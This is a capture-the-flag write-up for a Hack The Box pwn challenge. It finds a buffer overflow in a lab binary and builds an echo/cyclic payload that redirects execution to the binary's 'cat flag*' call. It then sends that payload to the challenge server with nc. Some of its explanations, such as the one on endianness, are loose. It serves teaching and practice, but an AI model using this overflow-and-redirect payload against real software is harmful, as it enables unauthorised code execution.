# GOING DEEPER

## A Challenge from the CA 2022 CTF sponsored by Siemens and hosted by HTB

Let's use strings to examine the binary. The interesting bit is below, alluding to a function that cats our flag:

`strings sp_going_deeper`

```bash DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft
%s[+] Welcome admin! The secret message is: 
cat flag*
%s[-] Authentication failed!
[!] For security reasons, you are logged out..
;*3$"
 ```

`checksec --file=sp_going_deeper`

```bash

┌──(root💀kali)-[~/Downloads/CTF/challenge]
└─#  checksec --file=sp_going_deeper     

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   77) Symbols	  No	0		2	sp_going_deeper
```

`checksec` tells us a lot about the security settings of the binary. No canary means buffer overflow likely possible and no PIE hints at a vulnerable binary.  PIE binarys (Position Independent Executables) are loaded into random locations within virtual memory each time the application is executed. This makes Return Oriented Programming (ROP) attacks much more difficult to execute reliably.  

Let's run the program.  Inputing a string of A's reveals it is vuln to a buffer overflow. Note the segmentation fault at the end:

`./sp_going_deeper`

```bash
 [*] Safety mechanisms are enabled!
[*] Values are set to: a = [1], b = [2], c = [3].
[*] If you want to continue, disable the mechanism or login as admin.

1. Disable mechanisms ⚙️
2. Login ✅
3. Exit 🏃
>> 1

[*] Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[-] Authentication failed!

[!] For security reasons, you are logged out..

qemu: uncaught target signal 11 (Segmentation fault) - core dumped
zsh: segmentation fault  ./sp_going_deeper
```

Let's use `cyclic` from pwntools to generate a pattern for our BO payload: The ` 1\n ` will select option 1 of the menu and hit enter for us when we run the program:

`echo -en "1\n$(cyclic 1024)" > payload`

```bash
┌──(root💀kali)-[~/Downloads/CTF/challenge]
└─# cat payload                 
1
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak 
```

Now lets use `gdb` to look under the hood further:  

```bash  
┌──(root💀kali)-[~/CTF/GoingDeeper/challenge]
└─# gdb ./sp_going_deeper                                                                                                                          
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git

This GDB was configured as "x86_64-linux-gnu".

Reading symbols from ./sp_going_deeper...
(No debugging symbols found in ./sp_going_deeper)
(gdb) source /opt/gef.py
GEF for linux ready, type `gef' to start, `gef config' to configure
96 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
gef➤  r < payload
Starting program: /root/CTF/GoingDeeper/challenge/sp_going_deeper < payload


                  Trying to leak information from the pc.. 🖥️


             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   | goldenfang@d12:$ history                    |    |
           |   |     1 ls                                    |    |
           |   |     2 mv secret_pass.txt flag.txt           |    |
           |   |     3 chmod -x missile_launcher.py          |    |
           |   |     4 ls                                    |    |
           |   |     5 history                               |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


[*] Safety mechanisms are enabled!
[*] Values are set to: a = [1], b = [2], c = [3].
[*] If you want to continue, disable the mechanism or login as admin.

1. Disable mechanisms ⚙️
2. Login ✅
3. Exit 🏃
>> 
[*] Input: 
[-] Authentication failed!

[!] For security reasons, you are logged out..


Program received signal SIGILL, Illegal instruction.
0x0000000000400b63 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x31              
$rbx   : 0x0               
$rcx   : 0x007ffff7af2104  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x007ffff7dcf8c0  →  0x0000000000000000
$rsp   : 0x007fffffffddf0  →  0x00000000400ba0  →  <__libc_csu_init+0> push r15
$rbp   : 0x7661616175616161 ("aaauaaav"?)

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sp_going_deeper", stopped 0x400b63 in main (), reason: SIGILL
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 

```

So we see the overflow spilled into the `$rbp` register represented as `("aaauaaav"?)`

`cyclic` shows our buffer overflowed at 81 bytes, so add 4 more to get to the end of the register, makes 85

```bash  
┌──(root💀kali)-[~/Downloads/CTF/challenge]
└─# cyclic -l aaav   
81
```

Let's use `r2` to get the address we need to point our payload to:

```bash
┌──(root💀kali)-[~/CTF/GoingDeeper/challenge]
└─# r2 sp_going_deeper                                                                                                      
[0x004007a0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x004007a0]> afl
0x004007a0    1 42           entry0
0x004007e0    4 42   -> 37   sym.deregister_tm_clones
0x00400810    4 58   -> 55   sym.register_tm_clones
0x00400850    3 34   -> 29   sym.__do_global_dtors_aux
0x00400880    1 7            entry.init0
0x00400c10    1 2            sym.__libc_csu_fini
0x00400c14    1 9            sym._fini
0x004009e9   18 350          sym.admin_panel
0x004008dd    1 191          sym.banner
0x00400750    1 6            sym.imp.time
0x00400740    1 6            sym.imp.srand
0x00400790    1 6            sym.imp.rand
0x004006f0    1 6            sym.imp.puts
0x00400ba0    4 101          sym.__libc_csu_init
0x004007d0    1 2            sym._dl_relocate_static_pie
0x00400b47    1 84           main
--------------snip-------------------

 ```
  
  The `aaaa` command does a full analysis, `afl` lists all functions. `pdf` (print disassembly of function) gives even more detail. Let's look deeper at `main`

[0x004007a0]> `pdf@main`

```bash
; DATA XREF from entry0 @ 0x4007bd
┌ 84: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_18h @ rbp-0x18
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t var_8h @ rbp-0x8
│           0x00400b47      55             push rbp
│           0x00400b48      4889e5         mov rbp, rsp
│           0x00400b4b      4883ec20       sub rsp, 0x20
│           0x00400b4f      e848feffff     call sym.setup
│           0x00400b54      e884fdffff     call sym.banner
│           0x00400b59      488d3de80000.  lea rdi, str.e_1_34m        ; 0x400c48 ; const char *s
│           0x00400b60      e88bfbffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400b65      48c745f80100.  mov qword [var_8h], 1
│           0x00400b6d      48c745f00200.  mov qword [var_10h], 2
│           0x00400b75      48c745e80300.  mov qword [var_18h], 3
│           0x00400b7d      488b55e8       mov rdx, qword [var_18h]
│           0x00400b81      488b4df0       mov rcx, qword [var_10h]
│           0x00400b85      488b45f8       mov rax, qword [var_8h]
│           0x00400b89      4889ce         mov rsi, rcx
│           0x00400b8c      4889c7         mov rdi, rax
│           0x00400b8f      e855feffff     call sym.admin_panel

```

The sym.admin_panel looks interesting- let's go deeper:

 [0x004007a0]> `pdf@sym.admin_panel`

 ```bash

            ; CALL XREF from main @ 0x400b8f
┌ 350: sym.admin_panel (uint32_t arg1, uint32_t arg2, uint32_t arg3);
│           ; var uint32_t var_48h @ rbp-0x48
│           ; var uint32_t var_40h @ rbp-0x40
│           ; var uint32_t var_38h @ rbp-0x38
│           ; var char *buf @ rbp-0x30
│           ; var uint32_t var_8h @ rbp-0x8
│           ; arg uint32_t arg1 @ rdi
│           ; arg uint32_t arg2 @ rsi
│           ; arg uint32_t arg3 @ rdx

      --------snip---------

│   0x00400b01      488d3d880a00.  lea rdi, str._n_s___Welcome_admin__The_secret_message_is:_ ; 0x401590 ; "\n%s[+] Welcome admin! The secret message is: " ; const char *format
│       │   0x00400b08      b800000000     mov eax, 0
│       │   0x00400b0d      e8fefbffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x00400b12      488d3da50a00.  lea rdi, str.cat_flag       ; 0x4015be ; "cat flag*" ; const char *string

 ```

This section is the juicy part.  It tells us the exact location address `0x00400b12` to point our payload.  If we can get the program to crash right here, it should execute the `cat flag*` command and output the flag file.

Using our BO offset of 85 bytes and the address of our cat command, putting it in Endian format, we construct the following payload2.
A quick note on Endian format. Take the address `0x00400b12` strip the last 3 hex numbers from it then place them in reverse order, inserting '\x' before each one:

`echo -en "1\n$(cyclic 85)\x12\x0B\x40" > payload2`

(gdb) `r < payload2`

Starting program: /root/Downloads/CTF/challenge/sp_going_deeper < payload2  

```bash
1. Disable mechanisms ⚙️
2. Login ✅
3. Exit 🏃
>> 
[*] Input: 
[-] Authentication failed!

[!] For security reasons, you are logged out..

[Detaching after fork from child process 412836]
HTB{f4k3_fl4g_4_t35t1ng}

[!] For security reasons, you are logged out..


Thread 1 "sp_going_deeper" received signal SIGSEGV, Segmentation fault.
0x0000ffffe80aeed0 in ?? ()
```

And it works! The test flag prints out.  Now to take this exploit remotely we just point it to our target like this:

`echo -en "1\n$(cyclic 85)\x12\x0B\x40" | nc 188.166.172.138 30681`

## The Flag

### HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}  

Credit: Big shoutout to hag, whose writeup really filled in some gaps and also inspired me to create my first project in markdown format using VS Code and Github. <https://github.com/hagronnestad>
